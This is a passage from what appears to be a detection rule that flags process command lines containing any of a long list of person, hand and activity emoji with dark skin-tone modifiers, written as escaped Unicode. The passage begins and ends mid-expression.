'\ud83d\udc75\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\uddd3\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc74\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc72\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc73\ud83c\udffe\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc73\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc73\ud83c\udffe\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd5\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc6e\ud83c\udffe\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc6e\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc6e\ud83c\udffe\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc77\ud83c\udffe\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc77\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc77\ud83c\udffe\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc82\ud83c\udffe\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc82\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc82\ud83c\udffe\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udd75\ud83c\udffe\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udd75\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udd75\ud83c\udffe\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffe\u200d\u2695\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffe\u200d\u2695\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffe\u200d\u2695\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffe\u200d\ud83c\udf3e' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffe\u200d\ud83c\udf3e' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffe\u200d\ud83c\udf3e' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffe\u200d\ud83c\udf73' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffe\u200d\ud83c\udf73' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffe\u200d\ud83c\udf73' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffe\u200d\ud83c\udf93' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffe\u200d\ud83c\udf93' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffe\u200d\ud83c\udf93' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffe\u200d\ud83c\udfa4' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffe\u200d\ud83c\udfa4' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffe\u200d\ud83c\udfa4' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffe\u200d\ud83c\udfeb' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffe\u200d\ud83c\udfeb' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffe\u200d\ud83c\udfeb' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffe\u200d\ud83c\udfed' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffe\u200d\ud83c\udfed' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffe\u200d\ud83c\udfed' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffe\u200d\ud83d\udcbb' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffe\u200d\ud83d\udcbb' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffe\u200d\ud83d\udcbb' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffe\u200d\ud83d\udcbc' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffe\u200d\ud83d\udcbc' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffe\u200d\ud83d\udcbc' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffe\u200d\ud83d\udd27' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffe\u200d\ud83d\udd27' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffe\u200d\ud83d\udd27' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffe\u200d\ud83d\udd2c' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffe\u200d\ud83d\udd2c' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffe\u200d\ud83d\udd2c' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffe\u200d\ud83c\udfa8' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffe\u200d\ud83c\udfa8' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffe\u200d\ud83c\udfa8' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffe\u200d\ud83d\ude92' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffe\u200d\ud83d\ude92' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffe\u200d\ud83d\ude92' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffe\u200d\u2708\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffe\u200d\u2708\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffe\u200d\u2708\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffe\u200d\ud83d\ude80' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffe\u200d\ud83d\ude80' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffe\u200d\ud83d\ude80' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffe\u200d\u2696\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffe\u200d\u2696\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffe\u200d\u2696\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc70\ud83c\udffe\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc70\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc70\ud83c\udffe\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd35\ud83c\udffe\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd35\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\udd35\ud83c\udffe\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc78\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\udec5\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\udd34\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\udd77\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\uddb8\ud83c\udffe\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddb8\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\uddb8\ud83c\udffe\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddb9\ud83c\udffe\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddb9\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\uddb9\ud83c\udffe\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd36\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffe\u200d\ud83c\udf84' || evt.Parsed.CommandLine contains '\ud83c\udf85\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\uddd9\ud83c\udffe\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd9\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\uddd9\ud83c\udffe\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udddd\ud83c\udffe\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udddd\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\udddd\ud83c\udffe\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udddb\ud83c\udffe\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udddb\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\udddb\ud83c\udffe\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udddc\ud83c\udffe\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udddc\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\udddc\ud83c\udffe\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddda\ud83c\udffe\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddda\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\uddda\ud83c\udffe\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc7c\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\udd30\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\udec4\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\udec3\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\udd31\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffe\u200d\ud83c\udf7c' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffe\u200d\ud83c\udf7c' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffe\u200d\ud83c\udf7c' || evt.Parsed.CommandLine contains '\ud83d\ude47\ud83c\udffe\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude47\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\ude47\ud83c\udffe\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc81\ud83c\udffe\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc81\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc81\ud83c\udffe\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude45\ud83c\udffe\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude45\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\ude45\ud83c\udffe\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude46\ud83c\udffe\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude46\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\ude46\ud83c\udffe\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude4b\ud83c\udffe\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude4b\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\ude4b\ud83c\udffe\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddcf\ud83c\udffe\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddcf\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\uddcf\ud83c\udffe\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd26\ud83c\udffe\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd26\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\udd26\ud83c\udffe\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd37\ud83c\udffe\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd37\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\udd37\ud83c\udffe\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude4e\ud83c\udffe\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude4e\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\ude4e\ud83c\udffe\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude4d\ud83c\udffe\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude4d\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\ude4d\ud83c\udffe\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc87\ud83c\udffe\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc87\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc87\ud83c\udffe\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc86\ud83c\udffe\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc86\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc86\ud83c\udffe\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd6\ud83c\udffe\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd6\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\uddd6\ud83c\udffe\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc83\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udd7a\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffe\u200d\ud83e\uddbd' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffe\u200d\ud83e\uddbd' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffe\u200d\ud83e\uddbd' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffe\u200d\ud83e\uddbc' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffe\u200d\ud83e\uddbc' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffe\u200d\ud83e\uddbc' || evt.Parsed.CommandLine contains '\ud83d\udeb6\ud83c\udffe\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udeb6\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udeb6\ud83c\udffe\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffe\u200d\ud83e\uddaf' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffe\u200d\ud83e\uddaf' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffe\u200d\ud83e\uddaf' || evt.Parsed.CommandLine contains '\ud83e\uddce\ud83c\udffe\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddce\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\uddce\ud83c\udffe\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfc3\ud83c\udffe\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfc3\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83c\udfc3\ud83c\udffe\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddcd\ud83c\udffe\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddcd\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\uddcd\ud83c\udffe\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc6d\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffe\u200d\ud83e\udd1d\u200d\ud83e\uddd1\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc6c\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc6b\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\uddd7\ud83c\udffe\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd7\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\uddd7\ud83c\udffe\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfc7\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83c\udfc2\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83c\udfcc\ud83c\udffe\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfcc\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83c\udfcc\ud83c\udffe\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfc4\ud83c\udffe\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfc4\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83c\udfc4\ud83c\udffe\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udea3\ud83c\udffe\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udea3\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udea3\ud83c\udffe\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfca\ud83c\udffe\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfca\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83c\udfca\ud83c\udffe\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\u26f9\ud83c\udffe\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\u26f9\ud83c\udffe' || evt.Parsed.CommandLine contains '\u26f9\ud83c\udffe\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfcb\ud83c\udffe\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfcb\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83c\udfcb\ud83c\udffe\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udeb4\ud83c\udffe\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udeb4\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udeb4\ud83c\udffe\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udeb5\ud83c\udffe\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udeb5\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udeb5\ud83c\udffe\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd38\ud83c\udffe\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd38\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\udd38\ud83c\udffe\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd3d\ud83c\udffe\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd3d\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\udd3d\ud83c\udffe\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd3e\ud83c\udffe\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd3e\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\udd3e\ud83c\udffe\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd39\ud83c\udffe\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd39\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\udd39\ud83c\udffe\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd8\ud83c\udffe\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd8\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\uddd8\ud83c\udffe\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udec0\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udecc\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc4b\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\udd1a\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udd90\ud83c\udfff' || evt.Parsed.CommandLine contains '\u270b\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udd96\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc4c\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\udd0c\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\udd0f\ud83c\udfff' || evt.Parsed.CommandLine contains '\u270c\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\udd1e\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\udef0\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\udd1f\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\udd18\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\udd19\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\udef5\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\udef1\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\udef2\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\udef3\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\udef4\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc48\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc49\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc46\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udd95\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc47\ud83c\udfff' || evt.Parsed.CommandLine contains '\u261d\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc4d\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc4e\ud83c\udfff' || evt.Parsed.CommandLine contains '\u270a\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc4a\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\udd1b\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\udd1c\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc4f\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\udef6\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\ude4c\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc50\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\udd32\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\ude4f\ud83c\udfff' || evt.Parsed.CommandLine contains '\u270d\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\udd33\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udcaa\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\uddb5\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\uddb6\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc42\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\uddbb\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc43\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc76\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc67\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\uddd2\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc66\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udfff\u200d\ud83e\uddb1' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udfff\u200d\ud83e\uddb1' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udfff\u200d\ud83e\uddb1' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udfff\u200d\ud83e\uddb0' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udfff\u200d\ud83e\uddb0' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udfff\u200d\ud83e\uddb0' || evt.Parsed.CommandLine contains '\ud83d\udc71\ud83c\udfff\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc71\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc71\ud83c\udfff\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udfff\u200d\ud83e\uddb3' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udfff\u200d\ud83e\uddb3' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udfff\u200d\ud83e\uddb3' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udfff\u200d\ud83e\uddb2' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udfff\u200d\ud83e\uddb2' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udfff\u200d\ud83e\uddb2' || evt.Parsed.CommandLine contains '\ud83e\uddd4\ud83c\udfff\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd4\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\uddd4\ud83c\udfff\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc75\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\uddd3\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc74\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc72\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc73\ud83c\udfff\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc73\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc73\ud83c\udfff\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd5\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc6e\ud83c\udfff\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc6e\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc6e\ud83c\udfff\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc77\ud83c\udfff\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc77\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc77\ud83c\udfff\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc82\ud83c\udfff\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc82\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc82\ud83c\udfff\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udd75\ud83c\udfff\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udd75\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udd75\ud83c\udfff\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udfff\u200d\u2695\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udfff\u200d\u2695\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udfff\u200d\u2695\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udfff\u200d\ud83c\udf3e' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udfff\u200d\ud83c\udf3e' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udfff\u200d\ud83c\udf3e' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udfff\u200d\ud83c\udf73' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udfff\u200d\ud83c\udf73' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udfff\u200d\ud83c\udf73' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udfff\u200d\ud83c\udf93' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udfff\u200d\ud83c\udf93' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udfff\u200d\ud83c\udf93' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udfff\u200d\ud83c\udfa4' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udfff\u200d\ud83c\udfa4' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udfff\u200d\ud83c\udfa4' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udfff\u200d\ud83c\udfeb' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udfff\u200d\ud83c\udfeb' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udfff\u200d\ud83c\udfeb' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udfff\u200d\ud83c\udfed' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udfff\u200d\ud83c\udfed' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udfff\u200d\ud83c\udfed' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udfff\u200d\ud83d\udcbb' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udfff\u200d\ud83d\udcbb' || evt.Parsed.CommandLine contains 